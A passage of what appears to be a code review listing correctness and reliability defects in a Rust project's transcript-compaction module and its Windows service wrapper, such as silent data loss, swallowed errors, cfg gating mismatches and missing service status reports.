i.e. the entire turn's content silently vanishes; the `if let` reads as defensive but is a data-loss trapdoor with no else branch; transcript_compact.rs:343 `rec.raw = to_string(&v).unwrap_or_else(|_| rec.raw.clone())` desyncs the two representations on failure: rec.value holds the EDITED value while rec.raw holds the ORIGINAL text, so validate() (which reads .value) passes while whatever writes the file from .raw emits uncompacted bytes, and the stats already counted the saving — the record's two views disagree with no signal; transcript_compact.rs:343 also silently reorders keys: serde_json is pulled without `preserve_order` (Cargo.toml:133), so Value::Object is a BTreeMap and every `changed` record is rewritten alphabetically while untouched records keep their original ordering — the output file is a mix of two serializations, which defeats byte-diffing a compaction against its input; transcript_compact.rs:185-198 parent_of is a plain insert keyed by uuid, so a transcript with duplicate uuids (branch/rewind, which the tree format permits) keeps only the LAST record's parent — resolve() at :220-230 then splices a dropped attachment's children onto the wrong ancestor, and validate cannot see it because the resulting parentUuid still exists; transcript_compact.rs:123-124 parse filters only `!l.is_empty()`, so a whitespace-only line becomes an unparsable Record (feeding the validate false-positive above), and size() at :135 assumes exactly one '\\n' per line while str::lines strips '\\r\\n' — a CRLF transcript is under-measured by one byte per line, biasing every reported saving; transcript_compact.rs:496 measure_batch allocates a fresh `vec![0; caps.len()]` for EVERY record inside the loop whose stated purpose (:440-445) is to be the fast single-pass scan — one malloc per transcript line, on the path that runs 10 configs x 54 files

### `src/win_service.rs`

lib.rs:72-73 gates 'pub mod win_service' on all(windows, not(feature="gui")) but bin/tab-atelier-headless.rs:83-84 calls try_run_as_service() under bare #[cfg(windows)] — building the headless binary on Windows WITH the gui feature fails to compile against a module that does not exist; invisible from Linux because both cfgs are off, and CLAUDE.md asks for BOTH feature configs to be checked; win_service.rs:78+84 'let _ = crate::headless::run()' discards the daemon's error and the Stopped report hard-codes ServiceExitCode::Win32(0), so a daemon that dies of a FATAL error reports a perfectly clean stop: the SCM's configured failure/recovery actions (restart-on-crash, the whole reason to run as a service) never fire and the Event Log shows a normal shutdown — the error must map to a non-zero Win32/ServiceSpecific code; win_service.rs:42+45-49 try_run_as_service() returns true whenever the DISPATCHER succeeded, independent of whether run_service() did anything at all — service_main swallows the Result, so a failing register() (63) or a failing first set_service_status() (65) returns immediately, the dispatcher returns Ok, try_run_as_service reports true and bin:84 returns exit 0: a service that silently did NOTHING is indistinguishable from a clean run; win_service.rs:39-42 .is_ok() conflates 'not launched by the SCM' (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT — the only case the comment describes) with every OTHER dispatcher failure (ERROR_INVALID_DATA, ERROR_SERVICE_ALREADY_RUNNING); any of those silently falls through to the console path, which under the SCM means never reporting Running, being killed on timeout, and losing the real cause; win_service.rs:68 controls_accepted omits ServiceControlAccept::PRESHUTDOWN — with SHUTDOWN alone the service only gets the short system-shutdown window, yet the whole point of the Stop path is to flush state (headless.rs:1165 persist), so a system shutdown can cut the flush short; PRESHUTDOWN is the control designed for exactly that; win_service.rs:52-61 the Stop handler flips SHUTDOWN_REQUESTED and returns NoError without ever reporting StopPending + a wait_hint, so the SCM keeps seeing Running for the entire wind-down and has no signal a stop is in progress (the flag itself is polled fast — headless.rs:1165 on a 250 ms idle tick — so the real exposure is the duration of persist()); win_service.rs:63-73 the ? on register/set_service_status returns before ANY status is reported, leaving the service stuck in the SCM's start-pending state until it times out; a panic inside headless::run() unwinds past the Stopped report at 80 the same way; win_service.rs:71/86 wait_hint: Duration::default() is meaningless on non-pending states — harmless in itself, but it is the tell for the pending-state reports that are missing above

